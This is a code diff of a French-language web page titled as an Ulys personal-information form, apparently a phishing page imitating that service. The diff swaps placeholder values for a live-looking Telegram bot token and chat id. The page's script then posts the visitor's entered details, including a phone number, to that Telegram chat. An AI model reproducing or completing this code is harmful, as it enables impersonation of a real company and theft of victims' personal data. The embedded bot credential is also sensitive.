@@ -6,11 +6,7 @@
   <title>Informations personnelles – Ulys</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
 
     body {
       font-family: 'Inter', sans-serif;
@@ -287,12 +283,12 @@
 📱 Téléphone : ${tel}
       `;
 
-      // Optionnel : remplace par ton vrai token/chat_id
-      fetch("https://api.telegram.org/botTON_BOT/sendMessage", {
+      // Envoi vers ton bot Telegram
+      fetch("https://api.telegram.org/bot7959354545:AAEfYBDF24DOs30vwYScteq1uWMO65FP8Fo/sendMessage", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: "TON_CHAT_ID",
+          chat_id: "-4911236455",
           text: message
         })
       });
